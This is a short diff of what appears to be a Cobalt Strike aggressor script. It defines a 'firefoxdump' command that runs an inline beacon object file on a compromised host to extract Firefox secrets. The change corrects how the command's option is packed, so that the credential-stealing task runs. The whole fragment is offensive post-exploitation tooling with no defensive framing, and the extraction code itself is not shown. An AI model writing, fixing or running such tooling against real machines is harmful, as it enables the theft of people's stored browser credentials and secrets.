@@ -46,7 +46,7 @@ alias firefoxdump {
     }
 
     # Pack option for BOF
-    $data = bof_pack($option);
+    $data = bof_pack($bid, "z", $option);
     btask($bid, "Extracting Firefox secrets");
     beacon_inline_execute($bid, $bof, "go", $data);
 }
